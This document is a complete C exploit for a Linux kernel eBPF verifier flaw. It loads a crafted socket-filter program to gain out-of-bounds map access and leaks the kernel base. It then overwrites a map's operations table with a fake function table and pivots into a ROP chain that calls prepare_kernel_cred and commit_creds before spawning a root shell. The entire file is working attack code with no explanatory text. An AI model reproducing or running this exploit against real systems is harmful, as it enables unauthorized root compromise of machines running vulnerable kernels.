#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/mman.h>
#include <string.h>
#include <stdint.h>
#include <sys/socket.h>
#include <stddef.h>
#include "bpf.h"

char buffer[64];
int sockets[2];
int ctrl_mapfd;
int vuln_mapfd;
size_t leakbuf[0x100];
size_t ctrlbuf[0x100];
size_t fake_func_table[0x10];
size_t kbase;
size_t pivot_esp;

void get_shell() {
  printf("[*] get shell\n");
  system("sh");
}

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status() {
  __asm__(
    "mov user_cs, cs;"
    "mov user_ss, ss;"
    "mov user_sp, rsp;"
    "pushf;"
    "pop user_rflags;"
  );
}
int load_prog()
{
  ctrl_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1, 0);
  if (ctrl_mapfd < 0) {
    puts("failed to create map1");
    return -1;
  }
  vuln_mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), 0x100, 1, 0);
  if (vuln_mapfd < 0) {
    puts("failed to create map2");
    return -1;
  }

  struct bpf_insn prog[] = {
    // DW == 8bytes
    BPF_GET_MAP(ctrl_mapfd, 0),
    BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_0, 0),
    BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_0, 8),
    BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_0, 16),
    BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),

    BPF_ST_MEM(BPF_W, BPF_REG_0, 0, 0x41414141),
    BPF_ST_MEM(BPF_W, BPF_REG_0, 4, 0x41414141),

    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, 0, 1),
    BPF_JMP_IMM(BPF_JA, 0, 0, 9), // goto exit
    BPF_JMP_IMM(BPF_JGE, BPF_REG_8, 0x1000, 8),

    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, 0, 1),
    BPF_JMP_IMM(BPF_JA, 0, 0, 6), // goto exit
    BPF_JMP_IMM(BPF_JGE, BPF_REG_9, 0x400, 5),

    BPF_ALU64_REG(BPF_RSH, BPF_REG_8, BPF_REG_9), // r8 >>= r9
    BPF_ALU64_REG(BPF_ADD, BPF_REG_0, BPF_REG_8), // r0 += r8

    // read / write switch
    BPF_JMP_IMM(BPF_JNE, BPF_REG_6, 0, 4),

    BPF_LDX_MEM(BPF_DW, BPF_REG_4, BPF_REG_0, 0), // r4 = *r0
    BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_4, 0x10), // *r6 = r4
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),

    BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_6, 0), // *r0 = r6
    BPF_MOV64_IMM(BPF_REG_0, 0),
    BPF_EXIT_INSN(),
  };
  return bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog, sizeof(prog) / sizeof(struct bpf_insn), "GPL");
}

void update_elem_ctrl()
{
  int key = 0;
  if (bpf_update_elem(ctrl_mapfd, &key, ctrlbuf, 0)) {
    printf("bpf_update_elem failed '%s'\n", strerror(errno));
  }
}

void get_elem_ctrl()
{
  int key = 0;
  if (bpf_lookup_elem(ctrl_mapfd, &key, leakbuf)) {
    printf("bpf_lookup_elem failed '%s'\n", strerror(errno));
  }
}

void debugmsg(void)
{
  char buffer[64];
  ssize_t n = write(sockets[0], buffer, sizeof(buffer));

  if (n < 0) {
    perror("write");
    return;
  }
  if (n != sizeof(buffer))
    fprintf(stderr, "short write: %lu\n", n);
}


void infoleak()
{
  update_elem_ctrl();
  debugmsg();
  get_elem_ctrl();
  debugmsg();
}

void overwrite_array_ops() {
  ctrlbuf[0] = 0x170 * 2;
  ctrlbuf[1] = 1;
  ctrlbuf[2] = ptr_to_u64(fake_func_table); // ebpf code will overwrite bpf_array->map->ops with our func table

  int n = 0;
  fake_func_table[n++] = 0x4141414141414141;
  fake_func_table[n++] = 0x4241414141414141;
  fake_func_table[n++] = 0x4341414141414141;
  fake_func_table[n++] = 0x4441414141414141;
  fake_func_table[n++] = pivot_esp;          // map_lookup_elem
  fake_func_table[n++] = 0x4641414141414141;
  fake_func_table[n++] = 0x4741414141414141;
  fake_func_table[n++] = 0x4841414141414141;
  fake_func_table[n++] = 0x4941414141414141;

  update_elem_ctrl();
  debugmsg();

  int key = 0;
  bpf_lookup_elem(vuln_mapfd, &key, leakbuf);

  perror("Should never reach here");
}

void prepare_ropchain() {
  save_status();

  void *pivot_base = u64_to_ptr(pivot_esp & 0xfffff000);
  size_t *pivot_buf = u64_to_ptr(pivot_esp & 0xffffffff);

  void *ptr = mmap(pivot_base, 0x2000, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  printf("[*] pivot_base ptr: %p\n", pivot_base);
  printf("[*] mmap ptr: %p\n", ptr);
  printf("[*] pivot_buf ptr: %p\n", pivot_buf);

  int n = 0;
  size_t pop_rdi = kbase + 0x27f9ad;
  size_t pop_r11_rbp = kbase + 0x3c401; // 0xffffffff8103c411: pop r11; pop rbp; ret;
  size_t pop_rcx = kbase + 0x57bd3; // 0xffffffff810af3e3: pop rcx; ret;
  size_t set_zero_flag = kbase + 0x50f95; // 0xffffffff81050ed5: xor esi, esi; ret;
  size_t mov_rdi_rax = kbase + 0x369c1d; // 0xffffffff8136a50d: mov rdi, rax; ja 0x56a4fd; pop rbp; ret;
  size_t swapgs = kbase + 0x9612fa; // 0xffffffff819623fa: swapgs; nop; nop; nop; ret;
  size_t sysret = kbase + 0x95f436; // 0xffffffff8195f436
  size_t prepare_kernel_cred = kbase + 0x82230;
  size_t commit_creds = kbase + 0x81e70;

  pivot_buf[n++] = pop_rdi;
  pivot_buf[n++] = 0;
  pivot_buf[n++] = prepare_kernel_cred;
  pivot_buf[n++] = set_zero_flag;
  pivot_buf[n++] = mov_rdi_rax;
  pivot_buf[n++] = 0;
  pivot_buf[n++] = commit_creds;
  pivot_buf[n++] = swapgs;
  pivot_buf[n++] = pop_rcx;
  pivot_buf[n++] = ptr_to_u64(get_shell); // will trigger page_fault while calling other function, but it should be fine
  pivot_buf[n++] = pop_r11_rbp;
  pivot_buf[n++] = user_rflags;
  pivot_buf[n++] = 0;
  pivot_buf[n++] = sysret;
}

int main() {
  int progfd = load_prog();

  if (progfd < 0) {
    printf("log:\n%s", bpf_log_buf);
    if (errno == EACCES)
      printf("failed to load prog '%s'\n", strerror(errno));
  }

  if (socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets)) {
    strerror(errno);
    return 0;
  }

  if (setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) < 0) {
    strerror(errno);
    return 0;
  }

  ctrlbuf[0] = 0x170 * 2;
  ctrlbuf[1] = 1;
  infoleak();

  kbase = leakbuf[2] - 0xa12100;
  printf("[+] leak kernel kbase: 0x%lx\n", kbase);

  pivot_esp = kbase + 0x6ec938;
  prepare_ropchain();
  overwrite_array_ops();
}
